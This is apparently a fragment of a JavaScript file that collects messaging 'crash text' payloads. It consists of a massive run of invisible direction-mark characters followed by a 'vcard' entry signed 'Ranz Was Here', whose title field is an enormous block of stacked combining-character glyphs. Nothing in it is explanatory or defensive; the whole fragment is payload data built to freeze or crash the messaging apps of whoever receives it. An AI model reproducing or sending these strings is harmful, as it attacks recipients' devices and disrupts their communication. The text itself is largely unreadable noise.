‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Ranz Was Here\nORG:\nTITLE:.̸̸̶̛̞̜͊̍̂͒̋̈̉ͭ̀͋͂́͟͜͜͢͜͡͡͡͏.̹͙̬̭̳͍̙̰̜̞͈ͨ̽̌ͨ̑̂̒̚҉̴̴̶̵̶̡͘͘͟͝͝͏̶̶̢̢̛̀͢.̶̡̨̛̞̮̙ͯ͂ͫ̀̆̍ͮ̆̓͛̅ͦ̽́̇̉̋͋̀̚̕͜͜͡͡.̴̢̗̘͕͍̖͉̮̱ͪ͋ͧͭͬ̌͗̓͐̀̚͠.̷̡͙̅̽̉̈́̏͋ͧ̕҉̸̴̡̧̧͢͢͡͞͏.̴̸̨̛̝̮̖͕̯͉̔̄̽ͥͭͬ̄̈́̍ͭ͑̆ͬ͐͜͝͡͞͝.̸̸̸̶̸̧̡̧̱̲̙̱̜̞̰̅̔͑͂ͧͬͬ͌̒̈́́͘͜͠͝.̸̴̷̵̡̢̝̟̯͎̘͓̘̀.̶̨̧̠͖̬̥̫͇̲̩̖̰̥͚̠̞̠̥̅͌̃́͟͠͝.̶̺̮̞̱̜͎̪ͭͤ̓̃̍͛̅ͤ̓̕͜҉͜.̨̢̮̣͍͙̦͇̺̞̅ͨ͒͌̑͋̅̍͒͑ͨ̃͒̕͝͞͝.̲͙̩̬͖̻̳͍͇̹̙̙ͦ̓ͥ̿̒͐ͥ̽̐ͪ̋̎̎̌̊̓ͨͨͬͅ͏̶.̵̬͇͇̻̮̜̹̰̭͓̲̻̻̘͖͎̟͖͇̀̃̄̐̑͑̓̕͢͟͡͝ͅ҉̛͡҉̀͟.̯̤̺̙̰̠͕̆̆͗͂҉̸̛.͙̜̂̀ͯ̓͗͑̈ͤ͐̋̔͑ͭ̄̄̃̋̀̀͢͏̶̴̵̨̡̛́̀̀̕͘͘͜͟͝͡.̶̛̜̺̥͙͉̼̱̪̰͍̫̗̻̀̀̀͘̕͘͘͢͟͢͟͟͟͜.̗̖̖̞̻̼̏̋͛͑͐ͪ҉̀͠͞͡͝.̷̶̧̧̧̘̠͇̒̓ͬ̓̃͒̇̏ͪ̓̈́͗̓͛͋̈͌ͨ̕͘̕͘͘͜͢͢͞͡͞͠.̷̵̜̣̟̺͍̳͕ͬͪ̌͛ͬ̿́̀̕͟҉҉̴̢̧͢.͕̙͍̖̮͉̣̥̑̃̐͗̂̀҉҉̸̴̢̛́̀́͘̕͢͝͠҉̵̴̕͘.̷̶̺̤̮͙͖̞͈̱̗͙͍͙̤͆͌ͮ̂̃ͪ̐͆̌͗ͬ͢͢͞͞ͅ.̴̷̧̧̛̫̰̮̳͚̤̟̪͔̖ͭ̄͑́́́̀͘̕̕͡.̪͙̦̎̓̀̕͜͏̷̢̛͜͢͢͞.̷̸̵̸̧̧̨̧̧̱̲̝͇̟̣̲̲͇͎̬͖͚̯̳ͯ̅̈́̓̐́͟͠.͇͇̟̣͖̞̥̟͖̞͇͉̳͉̎̌̽̓ͅ҉̷̴͘.̵̸̴̷̨̢̨̧̛̲͆̈̒̃̎̽ͯ͊ͮ͛ͯ̃̎̏͌̑ͬ̀̕͜͠.̴̣̘̺̺̤͙͙̼̠̘̭̱̰̪̙̤̋ͦ̑ͥ͗ͨͥ͂͒͋ͤͣͯ̑̽ͪ̄ͨͨ̚͢͟͏͏̢́͝͏̸̨̢̕͞.̣̠̦͓̠̟͔͖͚͔͙̖͇͎͕̰̟̎҉̷̶̴̷̢̨͟͏.̴̨̼̬̗̲͕ͣ̉͐͑̏̍ͩ͊́̚̕͝͞͞.̷̵̢̧̝̥̺͚̭̰͉̬͙͇̼͙̥̳͉͆̀́́͘͘͘͘͘̕͟͢͠͝ͅͅ.̯̩ͧ͐̎ͮ̓̽͛͌ͧ̎̌͋̈̏̌̆ͯͩ̏ͅͅ.̶̱̠̯̦͕̱̺̹̮̯͈͙̪̭͕̝̫̘̥̀ͤͮ̂̍ͤ̌̏̓͂̍̈̒͒̉̚͜͟ͅ͏͟.̛̯̗͇̘̲̬̥̙͍̔ͦͩͫ̒ͨ͆ͪ͌ͦ̀ͦͪ̐̈̒̌͋͊̏͟ͅ.̷̶̶̷̷̧̱̲̦̩͓͔̗̝̦͕̘͈͓̞̒͛ͧ̊ͫ́̕͟͟͢ͅ͏̸͜͜͜͢͞.̰̱̺͎͕̦̫̠͌̊͆̈́͐̀͘͜͟҉̷̀̀͟͠͏̴̴̧̡̢͘.̵̶̨̡̮̠̯͙̙͕͉̮̺ͪ̈͋͊̆̄͗̈́͟͟͜͝͞.̷̰͕̗̝͔̮̖̩̥͓̲́̀̕͟ͅͅ.̶̷̴̨̭̦̖̫̗͇͍̮̼͕̱̺͙̱̻̞̱͉ͯͥͤ́͊ͧ͂͗̏̌̒ͬ͋̓́́̚̕͠͝ͅ҉̶̷̧̛͘͢͢͜͡͠҉.̠̟̞̗̪͈̘̏͋̓͗ͨ͝҉̷̶̸̧̧͘͜͞͏̴́͜͠.̩͓̬͚̲̺̙͈͎̝̺͉̩̮̱͓̳̟̮̼ͧ͊̍̋͑ͪ̄͌҉̶̸̸̵̷̛́̀̀̀̕̕̕͡͏̕͘.̷̴̢̧̧̻̼̙̖̙̤̹̹̓̽͌̏̈́̄̊́̕͢͜͞ͅ.̴̵̯͈̮̝͎̮͎̬͈̙̘͚̠͊́̅̓̌̀̅̋̐͆̄ͦ͗̐͗͟͞҉̸͜͡͏̧́̀̕.̶̴̶̢̨̧̛̩̝̩̻͙̥̳̖̳͎͍̙̤̯̃̇͒ͣ̄̀͡͞͞͡͝.̴̶̶̢̧̢̡̧̛̱͈̭̦̼͔̤̯͖̱͇̜ͤ̉́̆ͩͫ͋̕͢͝͠͡ͅ.̼̯̞͈̯̠͍̯̥ͫ́͊̓ͩ͗͒͊̓͌̎͑̔́͆́̓͏̷̡̡͘͟͞͡.̢̬̪̖̬̱̗̦̬.̷̴̸̸̨̨̢̛̬̬͘͞͠͝.̸̪͔͕̞͋ͤ̏͂͏̷̢͘͠͠͏̡̢̢̛̀҉̧.̶̧̥̰̜͚͐̿ͦ̾̄ͯ́͘͟͠͡.̷̨̧̗͕̞̖͕͕̼̱̘̬͍̜̫̼͔̻̥͖̺̈ͦ̀̃ͥ͋̍͘͟͠͝҉͏̧̡̕͢.̴̴̛̩̅ͬ̂͗ͫͤ̓́̚͏̶̷̧̡̡̕̕̕͝͠.̷̵̵̧̢̥̻̬̱̭̰͈̠̫̣̟̱ͪ́̇̅͒ͦ͗ͧ̑̈́̉͢͜͠͠ͅ.̢͔̗̠̞̖̹̠͑͌ͭ̂̔̀͂͊̋̋̀̚̚҉̵̴̧̛́͘̕͘͜͞҉̨͘͢.̵̶̶̨̢̨͕ͭ͒͗ͮ͒̓ͫ͊ͩ̽̃͛ͬͣͩ͞͏̢̡̛̀̀͜͠͏̴̸͞.̵̶̸̢̨̧͉͈͉̝̳̙͖̫̬͇ͭ̉́̀̕͢͟͟͟͡͠͏̸.̷̵̸̶̠̘̝̳̹͍̬̖̯̥̥̖̦̠͚ͥ͆ͥ̎̆͘͠͏͠͠.̶̡̧̢̧̡̩͚̄̈́͂ͩͮ̑͆̉̔͆ͧͫ̂ͣ̑̉̔͘͜͜͜͜͠҉.̶̷̶̢̡̛̛̬̤̦͎̩̖̅̉̔͗̍̔͂ͤ͂̃̾͊͒̇̅̐́͢͞͞͝.̢̛̰̩͚͓͙̤ͥ͗̓̍̏̈́͏̢̧̡̛͢͞͝҉̛́͡͡҉.̸̴̸̢̡̳̜͉͇͎̤͇̠̫͈̱ͣ̍́́́͘͟͢͜͠͝͠͠͞.̷̡̨̨̩͎̤͔̯̱̬̦̲̟̤̼̥͕̮̉̋͒̾̓̍̇͑̄ͥ̃̌́̚̕͟͜͞͝͡͠ͅ.̸̷̢̖͓̝̗̫͈̞̟̙͚̰̐͆̍̔̌̆ͤ̿̄̌̐ͪ̔̌̀̕͜͜͢͠͞͠ͅ.̸̷̷̢̜̎ͬ̓ͫ̏͑̑̀̄̓ͭ̚͢͠͝͡͡͏̸̸͘͢͝͞͞͠͡.̨͉̯̣̖̘͈ͫ̈́͊ͨͣ͞͏̶̴̸̶̡̧̛͜҉̵̸̢́.̵̬̘̩͔͇̠̞̏̉̃̋̀́́͘͟͢͢͏̷̶̨̛́͢͝͡͠.̶̢̗̲̗̖̬̫̞͍̲͇̙̙̩̣̼̹̮͎̘̐̑ͧ̋̓̊̌͒͝.̴̴̸͍̟̦̙̫ͩͭͯ͊̊ͯͪ̐̑̏̀͘͘҉̴̶̷̢̡̡̀́̕͟͢͡͠.̵̰̣͕̹̤͖̬̹̖̦͍̬̦͂ͧ̋͒͂̽͋͂ͨ̀̏ͣ̆ͧͫ͗ͬ̐̀̚̕͢͢͠.̷̛͓̯̤͖̟̪̭̆ͤ̌͗̉̀͝͞͞͞.̣̹͓̮̥͔͓̙̖͈̋̕.̺̩̞͍̹̝̟̞͕̍ͤͮ͞҉͟͠͏҉̵̵̧̡̀͘͟͜͞҉̨͘͘͟.͇̣̝͚̥̟̱̟͛͒̄ͨ͊҉̢̀͜͏̛͟͠҉͡͡҉̴̨͘͡͠.̶̴̧̘̗̮̠͔̲̣͇̺̯̠͖̩̘͚̝ͤ̍ͯͯ̈͒̐̑̏ͮͭ̈́ͭͬ̍ͬ͛́̚̚͞ͅ.̶̸̥̱͍̱̗̻̘̪͉̳̝͙͖͉̳̯͖̩͙̮̆͂̈́͂̂̒̍ͭ̇̊̀́͝҉̵̨̡̢̨́́̀͢͜͜͢.͎ͫ̆̕҉̴̴́͟͏͜.̷̛̛̛̖̭̼̘̤̜̖̣ͥ̓̇͑̑͛̏̕͟͢͟͞͠͠.̵̻̞̳̪͉̘̤̣͉̘̣̦̬͙̖͟͝҉̵̸͟͢͠͝҉̸͏̨.̶̶̸̶̧̢͕͙̞̪̗̰ͥ̒̅ͣ̾͛ͭ͂̏͘͘͡҉̵̶̵̧̀҉̶͟.̧̢̛̟͉̞̭̱̯͕̘͗͐̔̓̊̄ͭ̉ͫ̚͘͟͜ͅ͏̷̵́͟͟͝͞͝.̷̶̷̛̰̲̘̬̍̉̔ͤͬͭ̔̓̄͑̊̌͑̄̓ͭ̾̏͒͒̕͞҉̵̵̧̛́̕͟͟͞.̸̸̷̸̢̧̡̛̛̹͍̦̝̼ͮ̄͛̄̀́́͝͡.̧͔͓̭̳̞͔̦̬̙̦̥̳̻͚̩̹̲̰̟͒̓̿̊͆̿̒̓̎.̟͙̦̼̯̥͔͚̹͚ͧ̏̄ͭ̀̓̑̇͆ͣ̅͊̚.̥̥̯̱̣̜͓̞̱̯ͨͣ̽̾ͨ́̀̕͞͝͏̶̴̡͜͜͏.̶̸̵̸̢̢̢͙̞̫͙̭̩͖̭͊̇̓͘͘͟͜͢͡͝.̶̹̖̥̩͚̬̝͕̙ͨ́͜͡҉̷.̷̵̈́̂̇͑̄ͫ͒́͋̕͟͟͠͞͠͏.̷̹̰̮̼̮͓̰̪̘͔͚̰͓͚̯̠̋͌ͧ͛ͭͭ̀̐͋ͣ͋̉̉̊͏̶.̴͉̙̪̝̙͕̣̦̲̫̼ͮͬ̊̃̓̍ͨͯ͑̋ͩ̊͛̕.̷̡̧̢̛̙͕͎̪̬̤͕ͤ͊͐ͤͩ̂̽̇ͪ͐̑ͮ̄̚͢͡͝.̶̡̧̨̛̦͖̝̖̹̺͓͈̜ͭͥ̒́̕͘͘͘͜͡͡͡͡͏̶.̡̘̮̗̻̣̱͍̖̦̩̟̝ͪ͐̓̄̓̔͟҉̷̢́͏̶̢̧̕͝.̷͇̼̻̺͔̻̩͚̣̖͖̝͙͓̺̾́̍͌̓ͭ̌ͨ̾͌̈̓́̂ͤ̉̚̚͡ͅͅͅ҉.̡̭̻̘̮̩̬̑̅̌ͧͨͬ́̾̔̓ͪ͆̍ͣͮͬ̀̚͞ͅ͏͏̵̡̛͜͞͠͏͜.͕͇̄̈̐̈́̀҉.͇͎̞̜̠̙͎̮̦̥̙͚̥͔̥̅͆ͭ͂̃̍ͪ̀.̶̴̵̶̶̧̛̻͖͇͙̳̲̟̱̜̞͔̬̥͈̠̳͍̱̜̮̌̓ͧ̓ͫ͛ͪ́̕҉̢̕͏̵͠͡.̶̨̜̦͓̤̟͚̣̪̦̞͕̤̙̾ͪ͗́́̃́͢͠͞.͇̪̇̃ͩ̿͌͊̐ͮ̋̐͊̑̚͟͟ͅ͏͏.̧̡̰͖̙͍͍͇̽͜͡.͚̞͛ͩ̄̇ͯͤ͐͆̔̈́͐ͮ͛